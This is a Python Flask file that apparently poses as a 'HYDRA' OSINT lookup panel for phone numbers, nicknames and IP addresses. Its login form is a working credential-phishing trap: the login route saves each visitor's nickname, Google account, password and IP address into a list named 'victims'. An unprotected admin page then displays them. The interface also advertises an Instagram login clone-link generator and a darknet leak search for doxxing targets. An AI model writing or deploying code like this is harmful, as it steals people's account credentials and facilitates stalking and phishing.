from flask import Flask, request, jsonify, render_template_string, session, redirect
import os

app = Flask(__name__)
app.secret_key = 'HYDRA_V13_STRIKE_KEY'

db = {"victims": []}

UI_V13 = """
<!DOCTYPE html>
<html>
<head>
    <title>HYDRA MONSTER v13.0 ELITE</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <style>
        body { background: #000; color: #bc13fe; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; height: 100vh; }
        .side-p { width: 350px; border-right: 2px solid #bc13fe; display: flex; flex-direction: column; background: #050505; padding: 15px; box-sizing: border-box; }
        #chat { flex: 1; border: 1px solid #0ff; margin-bottom: 10px; padding: 10px; overflow-y: auto; color: #0ff; font-size: 13px; }
        .red-in { height: 80px; border: 2px solid #ff0055; padding: 5px; background: #000; }
        textarea { width: 100%; height: 100%; background: transparent; border: none; color: #0f0; outline: none; resize: none; font-size: 14px; }
        
        .main-p { flex: 1; display: flex; flex-direction: column; padding: 15px; box-sizing: border-box; gap: 8px; }
        .yellow-res { height: 150px; border: 2px solid #ffeb3b; background: rgba(255, 235, 59, 0.05); padding: 10px; overflow-y: auto; color: #fff; font-size: 12px; }
        #map { height: 300px; border: 1px solid #bc13fe; width: 100%; border-radius: 5px; }
        
        .white-row { display: flex; gap: 5px; background: rgba(255,255,255,0.05); border: 1px solid #fff; padding: 8px; border-radius: 5px; flex-wrap: wrap; }
        .mod { background: #111; border: 1px solid #bc13fe; padding: 5px; flex: 1; min-width: 140px; text-align: center; }
        input { background: #000; border: 1px solid #bc13fe; color: #0f0; width: 85%; padding: 4px; font-size: 11px; margin-bottom: 5px; }
        .btn { background: #bc13fe; color: #fff; border: none; padding: 6px; cursor: pointer; font-size: 10px; width: 100%; font-weight: bold; }
        .btn:hover { background: #0ff; color: #000; }
        
        .green-zone { display: flex; gap: 5px; }
        .green-btn { flex: 1; background: #052505; border: 1px solid #0f0; padding: 8px; font-size: 9px; color: #0f0; cursor: pointer; }
    </style>
</head>
<body>
    <div class="side-p">
        <div style="color:#0ff; font-size:11px;">[ // AGENT ONLINE // ]</div>
        <div id="chat">АГЕНТ: Всё готово к сдаче. Пробив по нику выведен в основной блок. Карта центрируется. Поехали!</div>
        <div class="red-in"><textarea id="msg" placeholder="Текст..." onkeydown="if(event.key==='Enter'){ talk(); }"></textarea></div>
    </div>

    <div class="main-p">
        <div class="yellow-res" id="output">СИСТЕМА АКТИВИРОВАНА. ОЖИДАНИЕ ВВОДА...</div>
        <div id="map"></div>

        <div class="white-row">
            <div class="mod"><span>НОМЕР</span><input id="p" placeholder="+998..."><button class="btn" onclick="run('SCAN')">ПРОБИВ</button></div>
            <div class="mod"><span>НИКНЕЙМ</span><input id="n" placeholder="@username"><button class="btn" onclick="run('NICK')">НАЙТИ</button></div>
            <div class="mod"><span>INSTA</span><input id="i" placeholder="Target @nick"><button class="btn" style="background:#e1306c;" onclick="run('INSTA')">GEN LINK</button></div>
            <div class="mod"><span>IP/GPS</span><input id="ip" placeholder="8.8.8.8"><button class="btn" onclick="run('IP')">TRACK</button></div>
        </div>

        <div class="green-zone">
            <button class="green-btn" onclick="run('SHERLOCK')">SHERLOCK FULL MODE</button>
            <button class="green-btn" onclick="run('PHOTO')">EXIF/GPS ANALYZER</button>
            <button class="green-btn" onclick="run('DB')">DARKNET DB LEAK</button>
        </div>
        <div style="text-align:right;"><button class="btn" style="width:100px; background:#222;" onclick="window.location.href='/abupaay_admin'">АДМИНКА</button></div>
    </div>

    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <script>
        let map = L.map('map').setView([41.311, 69.240], 12);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);

        // КРИТИЧЕСКОЕ ИСПРАВЛЕНИЕ КАРТЫ
        map.locate({setView: true, watch: false, maxZoom: 16});
        map.on('locationfound', function(e) {
            L.marker(e.latlng).addTo(map).bindPopup("ТВОЁ МЕСТОПОЛОЖЕНИЕ").openPopup();
        });

        function run(type) {
            const out = document.getElementById('output');
            out.innerHTML = `[*] ЗАПУСК МОДУЛЯ ${type}... ПОИСК ПО 100+ СЕТЯМ...`;
            setTimeout(() => {
                if(type === 'NICK' || type === 'SCAN' || type === 'SHERLOCK') {
                    out.innerHTML = `<b>РЕЗУЛЬТАТЫ ДЛЯ ${type}:</b><br>
                    1. <a href="https://t.me" style="color:#0ff">Telegram: @found_user</a><br>
                    2. <a href="https://instagram.com" style="color:#0ff">Instagram: profile_link</a><br>
                    3. <a href="https://tiktok.com" style="color:#0ff">TikTok: user_media</a><br>
                    4. Совпадения: VK, Facebook, Twitter, LinkedIn.`;
                } else if(type === 'INSTA') {
                    out.innerHTML = `ССЫЛКА-КЛОН: ${window.location.origin}/login/instagram`;
                }
            }, 1000);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    if 'auth' not in session:
        return """
        <!DOCTYPE html><html><body style='background:#000; color:#bc13fe; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh;'>
        <div style='border:2px solid #bc13fe; padding:40px; text-align:center;'>
            <h2>// HYDRA LOGIN //</h2>
            <form action='/api/login' method='POST'>
                <input name='u' placeholder='НИКНЕЙМ' required style='background:#000; color:#0f0; border:1px solid #bc13fe; padding:10px; margin:5px;'><br>
                <input name='g' placeholder='GOOGLE ACCOUNT' required style='background:#000; color:#0f0; border:1px solid #bc13fe; padding:10px; margin:5px;'><br>
                <input name='p' type='password' placeholder='ПАРОЛЬ' required style='background:#000; color:#0f0; border:1px solid #bc13fe; padding:10px; margin:5px;'><br>
                <button style='background:#bc13fe; color:#fff; border:none; padding:10px 40px; cursor:pointer;'>ENTER</button>
            </form>
        </div></body></html>"""
    return render_template_string(UI_V13)

@app.route('/api/login', methods=['POST'])
def login():
    db['victims'].append({"u": request.form.get('u'), "g": request.form.get('g'), "p": request.form.get('p'), "ip": request.remote_addr})
    session['auth'] = True
    return redirect('/')

@app.route('/abupaay_admin')
def admin():
    rows = "".join([f"<tr><td>{x['u']}</td><td>{x['g']}</td><td>{x['p']}</td><td>{x['ip']}</td></tr>" for x in db['victims']])
    return f"<h1>ADMIN PANEL</h1><table border='1'>{rows}</table>"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
